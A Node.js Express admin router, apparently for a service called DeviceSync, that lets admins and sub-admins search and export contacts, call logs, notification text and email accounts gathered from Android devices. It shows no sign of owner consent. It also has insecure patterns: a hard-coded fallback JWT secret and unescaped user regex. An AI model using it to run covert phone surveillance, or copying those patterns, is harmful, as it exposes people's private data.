const express = require('express');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const Admin = require('../models/Admin');
const User = require('../models/User');
const UserAccess = require('../models/UserAccess');
const Device = require('../models/Device');
const DeviceData = require('../models/DeviceData');
const Notification = require('../models/Notification');
const Contact = require('../models/Contact');
const CallLog = require('../models/CallLog');
const EmailAccount = require('../models/EmailAccount');
const auth = require('../middleware/auth');

const router = express.Router();

// Admin Authentication Middleware
const adminAuth = async (req, res, next) => {
    try {
        const token = req.header('Authorization')?.replace('Bearer ', '');
        if (!token) {
            return res.status(401).json({ message: 'Access denied. No token provided.' });
        }

        const decoded = jwt.verify(token, process.env.JWT_SECRET || 'devicesync-secret-key-change-in-production');
        const admin = await Admin.findById(decoded.adminId);
        
        if (!admin || !admin.isActive) {
            return res.status(401).json({ message: 'Invalid token or admin inactive.' });
        }

        req.admin = admin;
        next();
    } catch (error) {
        res.status(401).json({ message: 'Invalid token.' });
    }
};

// Admin Login
router.post('/login', async (req, res) => {
    try {
        const { email, password } = req.body;

        // Check if admin exists
        const admin = await Admin.findOne({ email: email.toLowerCase() });
        if (!admin || !admin.isActive) {
            return res.status(401).json({ message: 'Invalid credentials or admin inactive.' });
        }

        // Verify password
        const isValidPassword = await admin.comparePassword(password);
        if (!isValidPassword) {
            return res.status(401).json({ message: 'Invalid credentials.' });
        }

        // Update last login
        admin.lastLogin = new Date();
        await admin.save();

        // Generate JWT token
        const token = jwt.sign(
            { adminId: admin._id, email: admin.email, role: admin.role },
            process.env.JWT_SECRET || 'devicesync-secret-key-change-in-production',
            { expiresIn: '24h' }
        );

        res.json({
            message: 'Admin login successful',
            token,
            admin: {
                id: admin._id,
                username: admin.username,
                email: admin.email,
                role: admin.role,
                permissions: admin.permissions
            }
        });
    } catch (error) {
        console.error('Admin login error:', error);
        res.status(500).json({ message: 'Server error.' });
    }
});

// Get Admin Profile
router.get('/profile', adminAuth, async (req, res) => {
    try {
        res.json({
            admin: {
                id: req.admin._id,
                username: req.admin.username,
                email: req.admin.email,
                role: req.admin.role,
                permissions: req.admin.permissions,
                lastLogin: req.admin.lastLogin
            }
        });
    } catch (error) {
        console.error('Get admin profile error:', error);
        res.status(500).json({ message: 'Server error.' });
    }
});

// Generate 5-digit user code
const generateUserCode = () => {
    return Math.floor(10000 + Math.random() * 90000).toString();
};

// Generate 5-digit device code for sub-admin
const generateDeviceCode = () => {
    return Math.floor(10000 + Math.random() * 90000).toString();
};

// Create new user access
router.post('/users', adminAuth, async (req, res) => {
    try {
        const { userEmail, userName, numDevices, password, fullName } = req.body;

        // Validate input
        if (!userEmail || !userName || !numDevices || !password) {
            return res.status(400).json({ message: 'Email, username, password, and number of devices are required.' });
        }

        if (numDevices < 1 || numDevices > 10) {
            return res.status(400).json({ message: 'Number of devices must be between 1 and 10.' });
        }

        // Check if user already exists
        const existingUserAccess = await UserAccess.findOne({ userEmail: userEmail.toLowerCase() });
        const existingUser = await User.findOne({ email: userEmail.toLowerCase() });
        
        if (existingUserAccess || existingUser) {
            return res.status(400).json({ message: 'User with this email already exists.' });
        }

        // Generate unique 5-digit code
        let userCode;
        let isUnique = false;
        while (!isUnique) {
            userCode = generateUserCode();
            const existingCode = await UserAccess.findOne({ userCode });
            const existingUserWithCode = await User.findOne({ user_internal_code: userCode });
            if (!existingCode && !existingUserWithCode) {
                isUnique = true;
            }
        }

        // Create new user access
        const userAccess = new UserAccess({
            userCode,
            userEmail: userEmail.toLowerCase(),
            userName,
            numDevices,
            createdBy: req.admin._id
        });

        // Create new user with authentication
        const user = new User({
            username: userName,
            email: userEmail.toLowerCase(),
            password: password,
            fullName: fullName || userName,
            user_internal_code: userCode,
            maxDevices: numDevices
        });

        await userAccess.save();
        await user.save();

        res.status(201).json({
            message: 'User created successfully with login access',
            userAccess: {
                userCode,
                userEmail,
                userName,
                numDevices,
                createdAt: userAccess.createdAt
            },
            user: {
                id: user._id,
                username: user.username,
                email: user.email,
                fullName: user.fullName,
                userCode: user.user_internal_code,
                subscriptionStatus: user.subscriptionStatus,
                maxDevices: user.maxDevices
            }
        });
    } catch (error) {
        console.error('Create user error:', error);
        res.status(500).json({ message: 'Server error.' });
    }
});

// Create new sub-admin
router.post('/sub-admins', adminAuth, async (req, res) => {
    try {
        // Only main admin can create sub-admins
        if (req.admin.role !== 'admin') {
            return res.status(403).json({ message: 'Only main admin can create sub-admins.' });
        }

        const { username, email, password, maxDevices } = req.body;

        // Validate input
        if (!username || !email || !password || !maxDevices) {
            return res.status(400).json({ message: 'Username, email, password, and max devices are required.' });
        }

        if (maxDevices < 1 || maxDevices > 100) {
            return res.status(400).json({ message: 'Max devices must be between 1 and 100.' });
        }

        // Check if admin already exists
        const existingAdmin = await Admin.findOne({ 
            $or: [
                { email: email.toLowerCase() },
                { username: username }
            ]
        });
        
        if (existingAdmin) {
            return res.status(400).json({ message: 'Admin with this email or username already exists.' });
        }

        // Generate unique 5-digit device code
        let deviceCode;
        let isUnique = false;
        while (!isUnique) {
            deviceCode = generateDeviceCode();
            const existingCode = await Admin.findOne({ deviceCode });
            if (!existingCode) {
                isUnique = true;
            }
        }

        // Create new sub-admin
        const subAdmin = new Admin({
            username,
            email: email.toLowerCase(),
            password,
            role: 'sub_admin',
            deviceCode,
            maxDevices,
            createdBy: req.admin._id,
            permissions: ['view_devices', 'view_analytics'] // Limited permissions for sub-admin
        });

        await subAdmin.save();

        res.status(201).json({
            message: 'Sub-admin created successfully',
            subAdmin: {
                id: subAdmin._id,
                username: subAdmin.username,
                email: subAdmin.email,
                role: subAdmin.role,
                deviceCode: subAdmin.deviceCode,
                maxDevices: subAdmin.maxDevices,
                permissions: subAdmin.permissions,
                createdAt: subAdmin.createdAt
            }
        });
    } catch (error) {
        console.error('Create sub-admin error:', error);
        res.status(500).json({ message: 'Server error.' });
    }
});

// Get all sub-admins
router.get('/sub-admins', adminAuth, async (req, res) => {
    try {
        // Only main admin can view all sub-admins
        if (req.admin.role !== 'admin') {
            return res.status(403).json({ message: 'Only main admin can view all sub-admins.' });
        }

        const subAdmins = await Admin.find({ role: 'sub_admin', isActive: true })
            .populate('createdBy', 'username email')
            .sort({ createdAt: -1 });

        res.json({
            subAdmins: subAdmins.map(subAdmin => ({
                id: subAdmin._id,
                username: subAdmin.username,
                email: subAdmin.email,
                role: subAdmin.role,
                deviceCode: subAdmin.deviceCode,
                maxDevices: subAdmin.maxDevices,
                permissions: subAdmin.permissions,
                createdAt: subAdmin.createdAt,
                lastLogin: subAdmin.lastLogin,
                createdBy: subAdmin.createdBy
            }))
        });
    } catch (error) {
        console.error('Get sub-admins error:', error);
        res.status(500).json({ message: 'Server error.' });
    }
});

// Get all users
router.get('/users', adminAuth, async (req, res) => {
    try {
        const users = await UserAccess.find({ isActive: true })
            .populate('createdBy', 'username email')
            .sort({ createdAt: -1 });

        res.json({
            users: users.map(user => ({
                id: user._id,
                userCode: user.userCode,
                userEmail: user.userEmail,
                userName: user.userName,
                numDevices: user.numDevices,
                createdAt: user.createdAt,
                lastAccess: user.lastAccess,
                deviceCount: user.devices.length,
                createdBy: user.createdBy
            }))
        });
    } catch (error) {
        console.error('Get users error:', error);
        res.status(500).json({ message: 'Server error.' });
    }
});

// Get user by code
router.get('/users/:userCode', adminAuth, async (req, res) => {
    try {
        const { userCode } = req.params;
        
        const user = await UserAccess.findOne({ userCode: userCode.toUpperCase() })
            .populate('createdBy', 'username email');

        if (!user) {
            return res.status(404).json({ message: 'User not found.' });
        }

        res.json({
            user: {
                id: user._id,
                userCode: user.userCode,
                userEmail: user.userEmail,
                userName: user.userName,
                numDevices: user.numDevices,
                createdAt: user.createdAt,
                lastAccess: user.lastAccess,
                devices: user.devices,
                createdBy: user.createdBy
            }
        });
    } catch (error) {
        console.error('Get user error:', error);
        res.status(500).json({ message: 'Server error.' });
    }
});

// Update user access
router.put('/users/:userCode', adminAuth, async (req, res) => {
    try {
        const { userCode } = req.params;
        const { userName, numDevices, isActive } = req.body;

        const user = await UserAccess.findOne({ userCode: userCode.toUpperCase() });
        if (!user) {
            return res.status(404).json({ message: 'User not found.' });
        }

        if (userName) user.userName = userName;
        if (numDevices !== undefined) {
            if (numDevices < 1 || numDevices > 10) {
                return res.status(400).json({ message: 'Number of devices must be between 1 and 10.' });
            }
            user.numDevices = numDevices;
        }
        if (isActive !== undefined) user.isActive = isActive;

        await user.save();

        res.json({
            message: 'User updated successfully',
            user: {
                id: user._id,
                userCode: user.userCode,
                userEmail: user.userEmail,
                userName: user.userName,
                numDevices: user.numDevices,
                isActive: user.isActive
            }
        });
    } catch (error) {
        console.error('Update user error:', error);
        res.status(500).json({ message: 'Server error.' });
    }
});

// Get all device data (admin view)
router.get('/device-data', adminAuth, async (req, res) => {
    try {
        const { userCode, deviceId, dataType, limit = 100, page = 1 } = req.query;
        
        let filter = {}; // Removed isActive filter temporarily
        if (userCode) filter.userCode = userCode.toUpperCase();
        if (deviceId) filter.deviceId = deviceId;
        
        // If sub-admin, only show data from their device code and limit by maxDevices
        if (req.admin.role === 'sub_admin') {
            filter.userCode = req.admin.deviceCode;
            
            // Get devices for this sub-admin's device code from Device collection
            const devices = await Device.find({ 
                user_internal_code: req.admin.deviceCode,
                isActive: true 
            }).limit(req.admin.maxDevices);
            
            if (devices.length > 0) {
                const deviceIds = devices.map(d => d.deviceId);
                filter.deviceId = { $in: deviceIds };
            } else {
                // No devices found, return empty result
                return res.json({
                    deviceData: [],
                    pagination: {
                        total: 0,
                        page: parseInt(page),
                        limit: parseInt(limit),
                        pages: 0
                    }
                });
            }
        }
        if (dataType) filter.dataType = dataType;

        const skip = (page - 1) * limit;
        
        const deviceData = await DeviceData.find(filter)
            .sort({ syncTimestamp: -1 })
            .limit(parseInt(limit))
            .skip(skip);

        const total = await DeviceData.countDocuments(filter);

        res.json({
            deviceData,
            pagination: {
                total,
                page: parseInt(page),
                limit: parseInt(limit),
                pages: Math.ceil(total / limit)
            }
        });
    } catch (error) {
        console.error('Get device data error:', error);
        res.status(500).json({ message: 'Server error.' });
    }
});

// Get device data summary
router.get('/device-data/summary', adminAuth, async (req, res) => {
    try {
        let matchStage = { isActive: true };
        
        // If sub-admin, only show data from their device code and limit by maxDevices
        if (req.admin.role === 'sub_admin') {
            matchStage.userCode = req.admin.deviceCode;
            
            // Get devices for this sub-admin's device code from Device collection
            const devices = await Device.find({ 
                user_internal_code: req.admin.deviceCode,
                isActive: true 
            }).limit(req.admin.maxDevices);
            
            if (devices.length > 0) {
                const deviceIds = devices.map(d => d.deviceId);
                matchStage.deviceId = { $in: deviceIds };
            } else {
                return res.json({ summary: [] });
            }
        }
        
        const summary = await DeviceData.aggregate([
            { $match: matchStage },
            {
                $group: {
                    _id: {
                        userCode: '$userCode',
                        dataType: '$dataType'
                    },
                    count: { $sum: 1 },
                    lastSync: { $max: '$syncTimestamp' }
                }
            },
            {
                $group: {
                    _id: '$_id.userCode',
                    dataTypes: {
                        $push: {
                            dataType: '$_id.dataType',
                            count: '$count',
                            lastSync: '$lastSync'
                        }
                    },
                    totalRecords: { $sum: '$count' }
                }
            }
        ]);

        res.json({ summary });
    } catch (error) {
        console.error('Get device data summary error:', error);
        res.status(500).json({ message: 'Server error.' });
    }
});

// Get all devices
router.get('/devices', adminAuth, async (req, res) => {
    try {
        let filter = { isActive: true };
        
        // If sub-admin, only show devices from their device code and limit by maxDevices
        if (req.admin.role === 'sub_admin') {
            filter.user_internal_code = req.admin.deviceCode;
            
            // Limit to maxDevices for sub-admin
            const devices = await Device.find(filter)
                .limit(req.admin.maxDevices)
                .sort({ createdAt: -1 });
            
            return res.json({ 
                devices: devices.map(device => ({
                    id: device._id,
                    deviceId: device.deviceId,
                    androidId: device.androidId,
                    deviceName: device.deviceName,
                    deviceModel: device.deviceModel,
                    user_internal_code: device.user_internal_code,
                    isActive: device.isActive,
                    lastSync: device.lastSync,
                    createdAt: device.createdAt,
                    updatedAt: device.updatedAt
                }))
            });
        }
        
        // For main admin, get all devices
        const devices = await Device.find(filter)
            .sort({ createdAt: -1 });

        res.json({ 
            devices: devices.map(device => ({
                id: device._id,
                deviceId: device.deviceId,
                androidId: device.androidId,
                deviceName: device.deviceName,
                deviceModel: device.deviceModel,
                user_internal_code: device.user_internal_code,
                isActive: device.isActive,
                lastSync: device.lastSync,
                createdAt: device.createdAt,
                updatedAt: device.updatedAt
            }))
        });
    } catch (error) {
        console.error('Get devices error:', error);
        res.status(500).json({ message: 'Server error.' });
    }
});

// Get devices by user code
router.get('/users/:userCode/devices', adminAuth, async (req, res) => {
    try {
        const { userCode } = req.params;
        
        // If sub-admin, verify they can access this user code
        if (req.admin.role === 'sub_admin' && req.admin.deviceCode !== userCode) {
            return res.status(403).json({ message: 'Access denied. You can only view devices for your assigned user code.' });
        }
        
        const devices = await Device.find({ 
            user_internal_code: userCode.toUpperCase(),
            isActive: true 
        }).sort({ createdAt: -1 });

        res.json({ 
            devices: devices.map(device => ({
                id: device._id,
                deviceId: device.deviceId,
                androidId: device.androidId,
                deviceName: device.deviceName,
                deviceModel: device.deviceModel,
                user_internal_code: device.user_internal_code,
                isActive: device.isActive,
                lastSync: device.lastSync,
                createdAt: device.createdAt,
                updatedAt: device.updatedAt
            }))
        });
    } catch (error) {
        console.error('Get devices by user code error:', error);
        res.status(500).json({ message: 'Server error.' });
    }
});

// Comprehensive data viewer with advanced filters - fetches from actual collections
router.get('/data-viewer', adminAuth, async (req, res) => {
    try {
        const {
            // Device filters
            deviceId,
            userCode,
            androidId,
            
            // Data type filters
            dataType, // contacts, call_logs, notifications, email_accounts
            
            // Date filters
            startDate,
            endDate,
            dateRange, // today, yesterday, last7days, last30days, last90days
            
            // Search filters
            search,
            searchField, // name, phone, email, etc.
            
            // Pagination
            page = 1,
            limit = 50,
            
            // Sorting
            sortBy = 'timestamp',
            sortOrder = 'desc', // asc, desc
            
            // Additional filters
            packageName,
            
            // Export options
            exportFormat, // csv, json
            includeSensitiveData = false
        } = req.query;

        // Get allowed device IDs based on admin role
        let allowedDeviceIds = [];
        
        if (req.admin.role === 'sub_admin') {
            // For sub-admin: get devices based on their deviceCode and maxDevices limit
            const devices = await Device.find({ 
                user_internal_code: req.admin.deviceCode,
                isActive: true 
            })
            .sort({ deviceId: 1 }) // Sort in ascending order
            .limit(req.admin.maxDevices);
            
            allowedDeviceIds = devices.map(d => d.deviceId);
            
            if (allowedDeviceIds.length === 0) {
                return res.json({
                    data: [],
                    pagination: {
                        total: 0,
                        page: parseInt(page),
                        limit: parseInt(limit),
                        pages: 0
                    },
                    filters: req.query,
                    summary: {
                        totalRecords: 0,
                        dataTypes: {},
                        devices: [],
                        dateRange: {}
                    }
                });
            }
        } else {
            // For main admin: get all devices if userCode is specified, otherwise all devices
            if (userCode) {
                const devices = await Device.find({ 
                    user_internal_code: userCode.toUpperCase(),
                    isActive: true 
                }).sort({ deviceId: 1 });
                allowedDeviceIds = devices.map(d => d.deviceId);
            } else {
                // Get all device IDs for main admin
                const devices = await Device.find({ isActive: true }).sort({ deviceId: 1 });
                allowedDeviceIds = devices.map(d => d.deviceId);
            }
        }

        // Apply device filter if specified
        if (deviceId) {
            if (Array.isArray(deviceId)) {
                allowedDeviceIds = allowedDeviceIds.filter(id => deviceId.includes(id));
            } else {
                allowedDeviceIds = allowedDeviceIds.filter(id => id === deviceId);
            }
        }

        if (allowedDeviceIds.length === 0) {
            return res.json({
                data: [],
                pagination: {
                    total: 0,
                    page: parseInt(page),
                    limit: parseInt(limit),
                    pages: 0
                },
                filters: req.query,
                summary: {
                    totalRecords: 0,
                    dataTypes: {},
                    devices: [],
                    dateRange: {}
                }
            });
        }

        // Build date filter
        let dateFilter = {};
        if (startDate || endDate || dateRange) {
            if (dateRange) {
                const now = new Date();
                switch (dateRange) {
                    case 'today':
                        dateFilter = {
                            $gte: new Date(now.getFullYear(), now.getMonth(), now.getDate()),
                            $lt: new Date(now.getFullYear(), now.getMonth(), now.getDate() + 1)
                        };
                        break;
                    case 'yesterday':
                        dateFilter = {
                            $gte: new Date(now.getFullYear(), now.getMonth(), now.getDate() - 1),
                            $lt: new Date(now.getFullYear(), now.getMonth(), now.getDate())
                        };
                        break;
                    case 'last7days':
                        dateFilter = {
                            $gte: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000)
                        };
                        break;
                    case 'last30days':
                        dateFilter = {
                            $gte: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000)
                        };
                        break;
                    case 'last90days':
                        dateFilter = {
                            $gte: new Date(now.getTime() - 90 * 24 * 60 * 60 * 1000)
                        };
                        break;
                }
            } else {
                if (startDate) dateFilter.$gte = new Date(startDate);
                if (endDate) dateFilter.$lt = new Date(new Date(endDate).getTime() + 24 * 60 * 60 * 1000);
            }
        }

        // Build search filter
        let searchFilter = {};
        if (search) {
            const searchRegex = new RegExp(search, 'i');
            if (searchField) {
                searchFilter[searchField] = searchRegex;
            } else {
                // Search across multiple fields based on data type
                searchFilter.$or = [
                    { name: searchRegex },
                    { phone: searchRegex },
                    { email: searchRegex },
                    { address: searchRegex },
                    { title: searchRegex },
                    { text: searchRegex },
                    { message: searchRegex },
                    { packageName: searchRegex },
                    { appName: searchRegex }
                ];
            }
        }

        // Package name filter
        if (packageName) {
            searchFilter.packageName = packageName;
        }

        // Build sort object
        const sortObj = {};
        sortObj[sortBy] = sortOrder === 'asc' ? 1 : -1;

        // Calculate pagination
        const skip = (parseInt(page) - 1) * parseInt(limit);
        
        let data = [];
        let total = 0;
        let summary = {};

        // Fetch data based on dataType
        if (dataType) {
            const validDataTypes = ['contacts', 'call_logs', 'notifications', 'email_accounts'];
            if (!validDataTypes.includes(dataType)) {
                return res.status(400).json({ error: 'Invalid data type' });
            }

            // Import required models
            const Contact = require('../models/Contact');
            const CallLog = require('../models/CallLog');
            const Notification = require('../models/Notification');
            const EmailAccount = require('../models/EmailAccount');

            let Model;
            let baseFilter = { deviceId: { $in: allowedDeviceIds } };

            switch (dataType) {
                case 'contacts':
                    Model = Contact;
                    break;
                case 'call_logs':
                    Model = CallLog;
                    break;
                case 'notifications':
                    Model = Notification;
                    break;
                case 'email_accounts':
                    Model = EmailAccount;
                    break;
            }

            // Apply date filter if specified
            if (Object.keys(dateFilter).length > 0) {
                baseFilter.timestamp = dateFilter;
            }

            // Apply search filter
            if (Object.keys(searchFilter).length > 0) {
                Object.assign(baseFilter, searchFilter);
            }

            // Get total count
            total = await Model.countDocuments(baseFilter);

            // Get data with pagination
            data = await Model.find(baseFilter)
                .sort(sortObj)
                .limit(parseInt(limit))
                .skip(skip);

            // Get summary for this data type
            const summaryData = await Model.aggregate([
                { $match: baseFilter },
                {
                    $group: {
                        _id: '$deviceId',
                        count: { $sum: 1 },
                        lastSync: { $max: '$timestamp' }
                    }
                }
            ]);

            summary = {
                totalCount: total,
                deviceCount: summaryData.length,
                lastSync: summaryData.length > 0 ? Math.max(...summaryData.map(d => d.lastSync)) : null
            };

        } else {
            // If no dataType specified, return summary of all data types
            const Contact = require('../models/Contact');
            const CallLog = require('../models/CallLog');
            const Notification = require('../models/Notification');
            const EmailAccount = require('../models/EmailAccount');

            const [contactsCount, callLogsCount, notificationsCount, emailAccountsCount] = await Promise.all([
                Contact.countDocuments({ deviceId: { $in: allowedDeviceIds } }),
                CallLog.countDocuments({ deviceId: { $in: allowedDeviceIds } }),
                Notification.countDocuments({ deviceId: { $in: allowedDeviceIds } }),
                EmailAccount.countDocuments({ deviceId: { $in: allowedDeviceIds } })
            ]);

            summary = {
                contacts: contactsCount,
                call_logs: callLogsCount,
                notifications: notificationsCount,
                email_accounts: emailAccountsCount
            };
        }

        // Get devices info
        const devicesInfo = await Device.find({ deviceId: { $in: allowedDeviceIds } });

        // Prepare response
        const response = {
            data: data.map(item => {
                const itemData = item.toObject();
                
                // Mask sensitive data if not requested
                if (!includeSensitiveData) {
                    if (itemData.phone) {
                        itemData.phone = itemData.phone.replace(/(\d{3})\d{4}(\d{4})/, '$1****$2');
                    }
                    if (itemData.email) {
                        const [local, domain] = itemData.email.split('@');
                        itemData.email = `${local.substring(0, 2)}***@${domain}`;
                    }
                    if (itemData.text) {
                        itemData.text = itemData.text.substring(0, 50) + '...';
                    }
                    if (itemData.message) {
                        itemData.message = itemData.message.substring(0, 50) + '...';
                    }
                }
                
                return itemData;
            }),
            pagination: {
                total,
                page: parseInt(page),
                limit: parseInt(limit),
                pages: Math.ceil(total / parseInt(limit))
            },
            filters: req.query,
            summary: {
                totalRecords: total,
                dataTypes: summary,
                devices: devicesInfo.map(device => ({
                    deviceId: device.deviceId,
                    deviceName: device.deviceName,
                    user_internal_code: device.user_internal_code
                })),
                allowedDeviceIds: allowedDeviceIds
            }
        };

        // Handle export
        if (exportFormat === 'csv') {
            res.setHeader('Content-Type', 'text/csv');
            res.setHeader('Content-Disposition', `attachment; filename="${dataType || 'all'}_data.csv"`);
            
            // Convert to CSV
            const csvData = convertToCSV(response.data);
            return res.send(csvData);
        }

        res.json(response);
    } catch (error) {
        console.error('Data viewer error:', error);
        res.status(500).json({ message: 'Server error.' });
    }
});

// Helper function to convert data to CSV
function convertToCSV(data) {
    if (!data || data.length === 0) return '';
    
    const headers = Object.keys(data[0]);
    const csvRows = [headers.join(',')];
    
    for (const row of data) {
        const values = headers.map(header => {
            const value = row[header];
            if (typeof value === 'object') {
                return JSON.stringify(value).replace(/"/g, '""');
            }
            return `"${String(value || '').replace(/"/g, '""')}"`;
        });
        csvRows.push(values.join(','));
    }
    
    return csvRows.join('\n');
}

// Get available filter options for data viewer
router.get('/data-viewer/filters', adminAuth, async (req, res) => {
    try {
        let deviceFilter = { isActive: true };
        
        // Sub-admin restrictions
        if (req.admin.role === 'sub_admin') {
            deviceFilter.user_internal_code = req.admin.deviceCode;
        }

        // Get all available devices
        const devices = await Device.find(deviceFilter)
            .select('deviceId androidId deviceName deviceModel user_internal_code')
            .sort({ deviceId: 1 });

        // Get all available user codes
        const userCodes = await Device.distinct('user_internal_code', { isActive: true });
        
        // Get all available data types
        const dataTypes = ['contacts', 'call_logs', 'notifications', 'email_accounts'];

        // Import models for date range info
        const Contact = require('../models/Contact');
        const CallLog = require('../models/CallLog');
        const Notification = require('../models/Notification');
        const EmailAccount = require('../models/EmailAccount');

        // Get date range info from all collections
        const [contactsDateRange, callLogsDateRange, notificationsDateRange, emailAccountsDateRange] = await Promise.all([
            Contact.aggregate([
                {
                    $group: {
                        _id: null,
                        earliestDate: { $min: '$timestamp' },
                        latestDate: { $max: '$timestamp' },
                        totalRecords: { $sum: 1 }
                    }
                }
            ]),
            CallLog.aggregate([
                {
                    $group: {
                        _id: null,
                        earliestDate: { $min: '$timestamp' },
                        latestDate: { $max: '$timestamp' },
                        totalRecords: { $sum: 1 }
                    }
                }
            ]),
            Notification.aggregate([
                {
                    $group: {
                        _id: null,
                        earliestDate: { $min: '$timestamp' },
                        latestDate: { $max: '$timestamp' },
                        totalRecords: { $sum: 1 }
                    }
                }
            ]),
            EmailAccount.aggregate([
                {
                    $group: {
                        _id: null,
                        earliestDate: { $min: '$timestamp' },
                        latestDate: { $max: '$timestamp' },
                        totalRecords: { $sum: 1 }
                    }
                }
            ])
        ]);

        // Combine date ranges
        const allDates = [
            contactsDateRange[0]?.earliestDate,
            callLogsDateRange[0]?.earliestDate,
            notificationsDateRange[0]?.earliestDate,
            emailAccountsDateRange[0]?.earliestDate,
            contactsDateRange[0]?.latestDate,
            callLogsDateRange[0]?.latestDate,
            notificationsDateRange[0]?.latestDate,
            emailAccountsDateRange[0]?.latestDate
        ].filter(date => date);

        const dateRangeInfo = {
            earliestDate: allDates.length > 0 ? Math.min(...allDates) : null,
            latestDate: allDates.length > 0 ? Math.max(...allDates) : null,
            totalRecords: (contactsDateRange[0]?.totalRecords || 0) + 
                         (callLogsDateRange[0]?.totalRecords || 0) + 
                         (notificationsDateRange[0]?.totalRecords || 0) + 
                         (emailAccountsDateRange[0]?.totalRecords || 0)
        };

        // Get package names for notifications
        const packageNames = await Notification.distinct('packageName');

        // Get searchable fields based on data types
        const searchableFields = {
            contacts: ['name', 'phone', 'email', 'address'],
            call_logs: ['phone', 'name', 'duration', 'type'],
            notifications: ['title', 'text', 'packageName', 'appName'],
            email_accounts: ['email', 'name', 'provider']
        };

        res.json({
            devices: devices.map(device => ({
                deviceId: device.deviceId,
                androidId: device.androidId,
                deviceName: device.deviceName || 'Unknown Device',
                deviceModel: device.deviceModel,
                user_internal_code: device.user_internal_code
            })),
            userCodes: userCodes.sort(),
            dataTypes: dataTypes,
            dateRange: dateRangeInfo,
            packageNames: packageNames.sort(),
            searchableFields,
            sortOptions: [
                { value: 'timestamp', label: 'Timestamp' },
                { value: 'name', label: 'Name' },
                { value: 'phone', label: 'Phone' },
                { value: 'email', label: 'Email' },
                { value: 'title', label: 'Title' },
                { value: 'packageName', label: 'Package Name' },
                { value: 'appName', label: 'App Name' },
                { value: 'duration', label: 'Duration' },
                { value: 'type', label: 'Type' }
            ],
            dateRangeOptions: [
                { value: 'today', label: 'Today' },
                { value: 'yesterday', label: 'Yesterday' },
                { value: 'last7days', label: 'Last 7 Days' },
                { value: 'last30days', label: 'Last 30 Days' },
                { value: 'last90days', label: 'Last 90 Days' }
            ]
        });
    } catch (error) {
        console.error('Get filter options error:', error);
        res.status(500).json({ message: 'Server error.' });
    }
});

// Comprehensive data display route for all collections
router.get('/all-data', adminAuth, async (req, res) => {
    try {
        const {
            // Collection filters
            collections = 'all', // all, notifications, contacts, calllogs, emailaccounts
            
            // Device filters
            deviceId,
            userCode,
            
            // Date filters
            startDate,
            endDate,
            
            // Search filters
            search,
            
            // Pagination
            page = 1,
            limit = 50,
            
            // Sorting
            sortBy = 'timestamp',
            sortOrder = 'desc',
            
            // Export options
            exportFormat, // csv, json
            includeSensitiveData = false
        } = req.query;

        // Build base filter for sub-admin restrictions
        let baseFilter = {};
        if (req.admin.role === 'sub_admin') {
            // For sub-admin, get devices they have access to based on their deviceCode
            const allowedDevices = await Device.find({ 
                user_internal_code: req.admin.deviceCode,
                isActive: true 
            }).limit(req.admin.maxDevices || 10);
            
            if (allowedDevices.length > 0) {
                const deviceIds = allowedDevices.map(d => d.deviceId);
                baseFilter.deviceId = { $in: deviceIds };
            } else {
                // No devices assigned, return empty result
                return res.json({
                    data: [],
                    pagination: {
                        total: 0,
                        page: parseInt(page),
                        limit: parseInt(limit),
                        pages: 0
                    },
                    summary: {
                        totalRecords: 0,
                        collections: {
                            notifications: 0,
                            contacts: 0,
                            calllogs: 0,
                            emailaccounts: 0
                        },
                        devices: []
                    },
                    filters: req.query
                });
            }
        }

        // Device filter
        if (deviceId) {
            baseFilter.deviceId = deviceId;
        }
        
        if (userCode) {
            baseFilter.user_internal_code = userCode.toUpperCase();
        }

        // Date filter
        let dateFilter = {};
        if (startDate || endDate) {
            if (startDate) dateFilter.$gte = new Date(startDate);
            if (endDate) dateFilter.$lt = new Date(new Date(endDate).getTime() + 24 * 60 * 60 * 1000);
        }

        // Search filter
        let searchFilter = {};
        if (search) {
            const searchRegex = new RegExp(search, 'i');
            searchFilter.$or = [
                { name: searchRegex },
                { phone: searchRegex },
                { email: searchRegex },
                { title: searchRegex },
                { text: searchRegex },
                { message: searchRegex },
                { packageName: searchRegex },
                { appName: searchRegex }
            ];
        }

        // Combine filters
        const finalFilter = { ...baseFilter, ...searchFilter };
        if (Object.keys(dateFilter).length > 0) {
            finalFilter.timestamp = dateFilter;
        }

        // Calculate pagination
        const skip = (parseInt(page) - 1) * parseInt(limit);
        const sortObj = {};
        sortObj[sortBy] = sortOrder === 'asc' ? 1 : -1;

        let allData = [];
        let totalCount = 0;
        let summary = {};

        // Determine which collections to query
        const collectionsToQuery = collections === 'all' 
            ? ['notifications', 'contacts', 'calllogs', 'emailaccounts']
            : collections.split(',');

        // Query each collection
        for (const collection of collectionsToQuery) {
            let collectionData = [];
            let collectionCount = 0;

            switch (collection) {
                case 'notifications':
                    collectionCount = await Notification.countDocuments(finalFilter);
                    collectionData = await Notification.find(finalFilter)
                        .sort(sortObj)
                        .limit(parseInt(limit))
                        .skip(skip);
                    break;

                case 'contacts':
                    collectionCount = await Contact.countDocuments(finalFilter);
                    collectionData = await Contact.find(finalFilter)
                        .sort(sortObj)
                        .limit(parseInt(limit))
                        .skip(skip);
                    break;

                case 'calllogs':
                    collectionCount = await CallLog.countDocuments(finalFilter);
                    collectionData = await CallLog.find(finalFilter)
                        .sort(sortObj)
                        .limit(parseInt(limit))
                        .skip(skip);
                    break;

                case 'emailaccounts':
                    collectionCount = await EmailAccount.countDocuments(finalFilter);
                    collectionData = await EmailAccount.find(finalFilter)
                        .sort(sortObj)
                        .limit(parseInt(limit))
                        .skip(skip);
                    break;
            }

            // Process and mask sensitive data
            const processedData = collectionData.map(item => {
                const itemData = item.toObject();
                
                // Add collection type
                itemData.collectionType = collection;
                
                // Mask sensitive data if not requested
                if (!includeSensitiveData) {
                    if (itemData.phone) {
                        itemData.phone = itemData.phone.replace(/(\d{3})\d{4}(\d{4})/, '$1****$2');
                    }
                    if (itemData.email) {
                        const [local, domain] = itemData.email.split('@');
                        itemData.email = `${local.substring(0, 2)}***@${domain}`;
                    }
                    if (itemData.text || itemData.message) {
                        const content = itemData.text || itemData.message;
                        itemData.text = itemData.text ? content.substring(0, 50) + '...' : undefined;
                        itemData.message = itemData.message ? content.substring(0, 50) + '...' : undefined;
                    }
                }
                
                return itemData;
            });

            allData = allData.concat(processedData);
            totalCount += collectionCount;
            summary[collection] = {
                count: collectionCount,
                data: processedData
            };
        }

        // Sort combined data if needed
        if (collections === 'all') {
            allData.sort((a, b) => {
                const aTime = new Date(a.timestamp || a.syncTime || a.createdAt);
